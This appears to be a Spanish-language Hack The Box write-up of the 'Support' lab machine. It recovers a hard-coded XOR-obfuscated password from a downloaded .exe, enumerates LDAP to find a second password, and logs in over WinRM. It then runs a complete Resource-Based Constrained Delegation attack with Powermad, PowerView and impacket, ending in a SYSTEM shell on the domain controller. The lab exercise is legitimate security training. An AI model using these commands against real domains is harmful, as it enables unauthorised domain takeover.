---
layout: single
title: Support - Hack The Box
excerpt: "En este post vamos a estar resolviendo la máquina Support de la plataforma de HackTheBox donde vamos a estar haciendo debugging a un .exe que descargaremos de la máquina para obtener una contraseña gracias a que podemos ver como funciona todo por detrás del ejecutable para la escalada de privilegios vamos a estar explotando un Resource Based Constrained Delegation Attack"
date: 2024-03-29
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-support/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Active Directory
  - EXE Binary Analysis
  - Resource Based Constrained Delegation Attack
  - Ldap Enumeration
  - Information Leakage
---

## PortScan

- Comenzamos escaneando los puertos abiertos y sus tecnologias con la herramienta `Nmap`.

```bash
➜  nmap nmap -sCV -p53,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49711 10.129.245.29 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 12:41 CST
Nmap scan report for 10.129.245.29
Host is up (0.091s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49711/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-03-29T18:42:15
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

## Enumeración

- Vamos agregar en nombre del dominio al `/etc/hosts`.

```bash
➜  nmap crackmapexec smb 10.129.245.29
SMB         10.129.245.29   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)

➜  nmap echo "10.129.245.29 support.htb dc.support.htb" | sudo tee -a /etc/hosts
10.129.245.29 support.htb dc.support.htb
```

- Si listamos los recursos compartidos por el protocolo **smb** vemos que tenemos acceso a un directorio llamado **support-tools**.

```bash
➜  nmap crackmapexec smb 10.129.245.29 -u 'miguel' -p '' --shares
SMB         10.129.245.29   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.245.29   445    DC               [+] support.htb\miguel:
SMB         10.129.245.29   445    DC               [+] Enumerated shares
SMB         10.129.245.29   445    DC               Share           Permissions     Remark
SMB         10.129.245.29   445    DC               -----           -----------     ------
SMB         10.129.245.29   445    DC               ADMIN$                          Remote Admin
SMB         10.129.245.29   445    DC               C$                              Default share
SMB         10.129.245.29   445    DC               IPC$            READ            Remote IPC
SMB         10.129.245.29   445    DC               NETLOGON                        Logon server share
SMB         10.129.245.29   445    DC               support-tools   READ            support staff tools
SMB         10.129.245.29   445    DC               SYSVOL                          Logon server share
```

- Vamos a conectarnos al recurso compartido.

```bash
➜  nmap impacket-smbclient support.htb/miguel@10.129.245.29 -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use support-tools
# ls
drw-rw-rw-          0  Wed Jul 20 12:01:06 2022 .
drw-rw-rw-          0  Sat May 28 06:18:25 2022 ..
-rw-rw-rw-    2880728  Sat May 28 06:19:19 2022 7-ZipPortable_21.07.paf.exe
-rw-rw-rw-    5439245  Sat May 28 06:19:55 2022 npp.8.4.1.portable.x64.zip
-rw-rw-rw-    1273576  Sat May 28 06:20:06 2022 putty.exe
-rw-rw-rw-   48102161  Sat May 28 06:19:31 2022 SysinternalsSuite.zip
-rw-rw-rw-     277499  Wed Jul 20 12:01:07 2022 UserInfo.exe.zip
-rw-rw-rw-      79171  Sat May 28 06:20:17 2022 windirstat1_1_2_setup.exe
-rw-rw-rw-   44398000  Sat May 28 06:19:43 2022 WiresharkPortable64_3.6.5.paf.exe
```

- Encontramos varios `.exe` pero sin duda el que llama mas la atención es el **UserInfo.exe.zip** vamos a descargarlo.

```bash
# get UserInfo.exe.zip
```

- Antes de descomprimirlo vamos a ver que es lo que hay dentro.

```bash
➜  content 7z l UserInfo.exe.zip

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 277499 bytes (271 KiB)

Listing archive: UserInfo.exe.zip

--
Path = UserInfo.exe.zip
Type = zip
Physical Size = 277499

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-05-27 11:51:05 .....        12288         5424  UserInfo.exe
2022-03-01 12:18:50 .....        99840        41727  CommandLineParser.dll
2021-10-22 17:42:08 .....        22144        12234  Microsoft.Bcl.AsyncInterfaces.dll
2021-10-22 17:48:04 .....        47216        21201  Microsoft.Extensions.DependencyInjection.Abstractions.dll
2021-10-22 17:48:22 .....        84608        39154  Microsoft.Extensions.DependencyInjection.dll
2021-10-22 17:51:24 .....        64112        29081  Microsoft.Extensions.Logging.Abstractions.dll
2020-02-19 04:05:18 .....        20856        11403  System.Buffers.dll
2020-02-19 04:05:18 .....       141184        58623  System.Memory.dll
2018-05-15 07:29:44 .....       115856        32709  System.Numerics.Vectors.dll
2021-10-22 17:40:18 .....        18024         9541  System.Runtime.CompilerServices.Unsafe.dll
2020-02-19 04:05:18 .....        25984        13437  System.Threading.Tasks.Extensions.dll
2022-05-27 10:59:39 .....          563          327  UserInfo.exe.config
------------------- ----- ------------ ------------  ------------------------
2022-05-27 11:51:05             652675       274861  12 files
```

- Bueno al parecer hay muchos archivos de configuración así que para ver mejor el contenido y ver que se hace por detrás vamos a pasar el comprimido a una maquina Windows para usar `dnspy` y `debugear` el archivo <https://github.com/dnSpy/dnSpy>.

- `Debugeando` encontramos un código interesante.

- El código configura una conexión LDAP llama a un método `Protected.getPassword()` para recuperar una contraseña.

<p align="center">
<img src="/assets/images/htb-writeup-support/1.png">
</p>

- Si nos vamos a `Protected` vemos el código que al parecer lo que hace es desencriptar una contraseña que esta codificada en `base64` y encriptada mediante una operación `XOR`.

<p align="center">
<img src="/assets/images/htb-writeup-support/2.png">
</p>

- En el campo `enc_password` almacena una cadena que es una contraseña encriptada que esta en formato base64 y el campo `key` almacena una clave en forma de arreglo la clave parece ser derivada de la cadena **armando**.

<p align="center">
<img src="/assets/images/htb-writeup-support/3.png">
</p>

- El problema de esto es que sabemos como funciona todo para poder obtener la contraseña en texto plano podemos usar Python3 para obtenerla simplemente siguiendo el funcionamiento del código.

- Simplemente ejecutamos `Python3` e importamos el modulo `base64` para decodificar la contraseña encriptada, después la variable `enc_password` contiene la contraseña encriptada, la clave `key` contiene la clave para la operación `XOR` que en este caso la clave es la cadena `ASCII` **armando**, después la contraseña encriptada se decodifica, se realiza la operación mediante un ciclo for que itera sobre cada byte de la contraseña encriptada y lo desencripta utilizando la calve y el valor (223) mediante la operación `XOR` y al final el resultado se convierte a una cadena utilizando caracteres `UTF-8` y se muestra por pantalla.

```bash
➜  content python3
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
>>> key = bytes("armando", encoding='ascii')
>>> decoded_password = base64.b64decode(enc_password)
>>> decrypted_password = bytes([decoded_password[i] ^ key[i % len(key)] ^ 223 for i in range(len(decoded_password))])
>>> password = decrypted_password.decode('utf-8')
>>> print("Decrypted Password:", password)
Decrypted Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
>>>
```

## Shell as Support

- Una vez tenemos la contraseña en texto plano podemos comprobar si son correctas ya que nos decía que con el usuario `ldap` podemos conectarnos al servicio utilizando la contraseña.

```bash
➜  content crackmapexec ldap 10.129.245.29 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.129.245.29   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
LDAP        10.129.245.29   389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

- Al ver que son correctas podemos enumerar el servicio `ldap` <https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap>.

- Al parecer el output es demasiada información pero si `grepeamos` por `info:` encontramos una contraseña.

```bash
➜  content ldapsearch -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'CN=Users,DC=support,DC=htb' | grep info:
info: Ironside47pleasure40Watchful
```

- Al parecer es del usuario `Support`.

```bash
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
```

- Probando con `rpcclient` podemos conectarnos y enumerar los usuarios del dominio.

```bash
➜  content rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.129.245.29 -c 'enumdomusers'
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ldap] rid:[0x450]
user:[support] rid:[0x451]
user:[smith.rosario] rid:[0x452]
user:[hernandez.stanley] rid:[0x453]
user:[wilson.shelby] rid:[0x454]
user:[anderson.damian] rid:[0x455]
user:[thomas.raphael] rid:[0x456]
user:[levine.leopoldo] rid:[0x457]
user:[raven.clifton] rid:[0x458]
user:[bardot.mary] rid:[0x459]
user:[cromwell.gerard] rid:[0x45a]
user:[monroe.david] rid:[0x45b]
user:[west.laura] rid:[0x45c]
user:[langley.lucy] rid:[0x45d]
user:[daughtler.mabel] rid:[0x45e]
user:[stoll.rachelle] rid:[0x45f]
user:[ford.victoria] rid:[0x460]
```

- Como tenemos una contraseña vamos a guardar los usuarios en una lista.

```bash
➜  content rpcclient -U 'ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' 10.129.245.29 -c 'enumdomusers' | grep -oP '\[\D*?\]' | tr -d '[]' > users.txt
➜  content cat users.txt
Administrator
Guest
krbtgt
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
```

- Vamos a ver si podemos conectarnos con `evil-winrm` con la contraseña que tenemos para ver si le pertenece a otro usuario por que con `rpcclient` vimos que es de `support`.

```bash
➜  content crackmapexec winrm 10.129.245.29 -u users.txt -p 'Ironside47pleasure40Watchful' --continue-on-success
SMB         10.129.245.29   5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.129.245.29   5985   DC               [*] http://10.129.245.29:5985/wsman
WINRM       10.129.245.29   5985   DC               [-] support.htb\Administrator:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\Guest:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\krbtgt:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\ldap:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
WINRM       10.129.245.29   5985   DC               [-] support.htb\smith.rosario:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\hernandez.stanley:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\wilson.shelby:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\anderson.damian:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\thomas.raphael:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\levine.leopoldo:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\raven.clifton:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\bardot.mary:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\cromwell.gerard:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\monroe.david:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\west.laura:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\langley.lucy:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\daughtler.mabel:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\stoll.rachelle:Ironside47pleasure40Watchful
WINRM       10.129.245.29   5985   DC               [-] support.htb\ford.victoria:Ironside47pleasure40Watchful
```

- Nos podemos conectar gracias a que el usuario **support** pertenece al grupo `Remote Management Users`.

```bash
➜  content evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> type C:\Users\support\Desktop\user.txt
05e7a42ec2aa2d13e6eaee5383b2ed97
*Evil-WinRM* PS C:\Users\support\Documents>
```

## Escalada de privilegios

- Para enumerar la maquina y poder ver vias potenciales de elevar nuestros privilegios vamos a usar **Bloodhound** <https://www.kali.org/tools/bloodhound/>.

- Para eso vas a necesitar descargar el **.zip** <https://github.com/BloodHoundAD/SharpHound>.

```bash
➜  content unzip SharpHound-v2.3.3.zip
Archive:  SharpHound-v2.3.3.zip
  inflating: SharpHound.exe
  inflating: SharpHound.exe.config
  inflating: SharpHound.pdb
  inflating: SharpHound.ps1
  inflating: System.Console.dll
  inflating: System.Diagnostics.Tracing.dll
  inflating: System.Net.Http.dll
```

- Ahora lo subimos.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> upload /home/miguel/Hackthebox/Support/content/SharpHound.exe

Info: Uploading /home/miguel/Hackthebox/Support/content/SharpHound.exe to C:\Users\support\Documents\SharpHound.exe

Data: 1791316 bytes of 1791316 bytes copied

Info: Upload successful!
```

- Ahora lo ejecutamos.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> .\SharpHound.exe -c All
```

- Ahora tenemos el comprimido.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> ls


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
-a----         3/29/2024   1:18 PM        1343488 SharpHound.exe
-a----         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


*Evil-WinRM* PS C:\Users\support\Documents>
```

- Ese `.zip` lo vamos a subir a `BloodHound` vamos a descargarlo.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> download C:\Users\support\Documents\20240329132001_BloodHound.zip info.zip

Info: Downloading C:\Users\support\Documents\20240329132001_BloodHound.zip to info.zip

Info: Download successful!
```

- Vemos que hay un grupo que se llama **Shared Support Accounts**.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> net group

Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Shared Support Accounts
The command completed with one or more errors.
```

- Podemos ver eso en **Bloodhound**.

- El grupo `SHARED SUPPORT ACCOUNTS` tiene `GenericAll` en el `DC` .

<p align="center">
<img src="/assets/images/htb-writeup-support/priv.png">
</p>

# Resource based constrained delegation attack

- En este post nos explican como funciona todo <https://github.com/tothi/rbcd-attack>, <https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation>.

- Para explotar esto necesitaremos de lo siguiente <https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>, <https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1>.

- Ahora lo subimos ala maquina y lo importamos para que lo interprete.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> upload /home/miguel/Hackthebox/Support/content/PowerView.ps1

Info: Uploading /home/miguel/Hackthebox/Support/content/PowerView.ps1 to C:\Users\support\Documents\PowerView.ps1

Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\support\Documents> dir


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/29/2024   1:20 PM          22935 20240329132001_BloodHound.zip
-a----         3/29/2024   2:34 PM         770279 PowerView.ps1
-a----         3/29/2024   1:18 PM        1343488 SharpHound.exe
-a----         3/29/2024   1:20 PM          44570 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Documents>
```

```bash
*Evil-WinRM* PS C:\Users\support\Documents> upload /home/miguel/Hackthebox/Support/content/Powermad.ps1

Info: Uploading /home/miguel/Hackthebox/Support/content/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1

Data: 180768 bytes of 180768 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module .\Powermad.ps1
```

- Vamos a comenzar creando un **Computer object**.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount Nuevo -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = Nuevo$
Verbose: [+] Distinguished Name = CN=Nuevo,CN=Computers,DC=support,DC=htb
[+] Machine account Nuevo added
```

- Comprobamos que exista.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer Nuevo


pwdlastset             : 3/29/2024 2:39:18 PM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=Nuevo,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : Nuevo
objectsid              : S-1-5-21-1677581083-3380853377-188903654-6101
samaccountname         : Nuevo$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 3/29/2024 9:39:18 PM
instancetype           : 4
usncreated             : 90263
objectguid             : df9abf14-106b-4628-af15-0893a1ecf055
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/Nuevo, HOST/Nuevo, RestrictedKrbHost/Nuevo.support.htb, HOST/Nuevo.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : Nuevo
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 3/29/2024 9:39:18 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 90265
dnshostname            : Nuevo.support.htb
```

- Vamos a seguir con los pasos que nos dan.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer Nuevo -Properties objectsid | Select -Expand objectsid
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

- Ahora usaremos impacket para obtener un ticket suplantando al Administrator.

```bash
➜  content impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.245.29 support.htb/Nuevo$:123456
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

- Ahora vamos a exportar la variable de entorno con el nombre del ticket.

```bash
➜  content export KRB5CCNAME=Administrator.ccache
```

- Ahora ya nos podemos conectar y leer la `flag`.

```bash
➜  content impacket-psexec -k dc.support.htb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file GoDYfrro.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service tmuw on dc.support.htb.....
[*] Starting service tmuw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
7088702023ddab61e77faaf6ac6fcbc2
```



